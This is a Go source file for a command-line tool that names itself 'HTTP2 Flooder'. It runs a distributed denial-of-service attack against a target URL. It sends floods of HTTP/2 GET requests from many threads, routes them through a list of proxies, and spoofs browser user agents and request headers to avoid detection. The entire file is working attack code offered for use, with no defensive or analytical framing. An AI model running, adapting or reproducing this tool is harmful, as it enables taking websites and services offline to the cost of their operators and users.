package main

import (
    "fmt"
    "net/http"
    "net/url"
    "time"
    "os"
    "strconv"
    "crypto/tls"
    "math/rand"
    "sync"
    "net"
    "bufio"
    "strings"
)

var proxies = []string{}

func http2(wg * sync.WaitGroup, target string, rps int) {
    restart: 
    proxy := fmt.Sprintf("http://%s", proxies[rand.Intn(len(proxies))])
    config := &tls.Config{
        InsecureSkipVerify: true,
        MinVersion:         tls.VersionTLS12,
        NextProtos:         []string{"h2"},
        CurvePreferences: []tls.CurveID{
            tls.X25519,
            tls.CurveP256,
            tls.CurveP384,
            tls.CurveP521,
        },
        CipherSuites: []uint16{
            tls.TLS_AES_128_GCM_SHA256,
            tls.TLS_AES_256_GCM_SHA384,
            tls.TLS_CHACHA20_POLY1305_SHA256,
            tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
            tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
        },
        PreferServerCipherSuites: true,
    }
    url, _ := url.Parse(proxy)
    httptransport := &http.Transport{
      Proxy: http.ProxyURL(url),
      ForceAttemptHTTP2: true,
      TLSClientConfig: config,
      Dial: (&net.Dialer{
        Timeout:   30 * time.Second,
        KeepAlive: 30 * time.Second,
        DualStack: true,
      }).Dial,
      DialTLS: func(network, addr string) (net.Conn, error) {
			  dialer := &net.Dialer{
				  Timeout: 5 * time.Second,
			  }
			  conn, err := dialer.Dial(network, addr)
			  if err != nil {
				  return nil, err
			  }
			  tlsConn := tls.Client(conn, config)
			  err = tlsConn.Handshake()
			  if err != nil {
				  return nil, err
			  }
			  return tlsConn, nil
		  },
    }
    client := http.Client{
        Transport: httptransport,
    }
    req, _ := http.NewRequest("GET", target, nil)
    version := rand.Intn(20) + 95
    userAgents := []string{fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0", version, version), fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", version)}
    userAgent := rand.Intn(len(userAgents))
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("Accept-Language", "de,en-US;q=0.7,en;q=0.3")
    req.Header.Set("Cache-Control", "no-cache")
    req.Header.Set("Connection", "keep-alive")
    req.Header.Set("Pragma", "no-cache")
    req.Header.Set("Upgrade-Insecure-Requests", "1")
    req.Header.Set("User-Agent", userAgents[userAgent])
    req.Header.Set("Sec-Fetch-Dest", "document")
    req.Header.Set("Sec-Fetch-Mode", "navigate")
    req.Header.Set("Sec-Fetch-Site", "none")
    req.Header.Set("Sec-Fetch-User", "?1")
    req.Header.Set("X-Requested-With", "XMLHttpRequest")
    for i := 0; i < rps; i++ {
        resp, err := client.Do(req)
        if err != nil {
            goto restart
        }
        if resp.StatusCode >= 400 && resp.StatusCode != 404 {
            goto restart
        }
    }
    defer wg.Done()
}

func main() {
    rand.Seed(time.Now().UnixNano())
    if len(os.Args) < 5 {
        fmt.Println(fmt.Sprintf("\033[34mHTTP2 Flooder \033[0m- \033[33mMade by @udbnt\033[0m\n\033[31m%s target, duration, rps, proxylist, threads\033[0m", os.Args[0]))
        return
    }
    var target string
    var duration int
    var rps int
    var proxylist string
    var threads int
    var wg sync.WaitGroup
    target = os.Args[1]
    duration, _ = strconv.Atoi(os.Args[2])
    rps, _ = strconv.Atoi(os.Args[3])
    proxylist = os.Args[4]
    threads, _ = strconv.Atoi(os.Args[5])
    
    file, err := os.Open(proxylist)
    if err != nil {
        fmt.Println("Error reading file:", err)
        return
    }
    defer file.Close()
    
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        proxies = append(proxies, strings.TrimSpace(scanner.Text()))
    }
    
    if len(proxies) == 0 {
        fmt.Println("No proxies found in file")
        return
    }

    for i := 0; i < threads; i++ {
        wg.Add(1)
        go http2(&wg, target, rps)
        time.Sleep(1 * time.Millisecond)
    }
    go func() {
      time.Sleep(time.Duration(duration) * time.Second)
      os.Exit(0)
    }()
    wg.Wait()
}
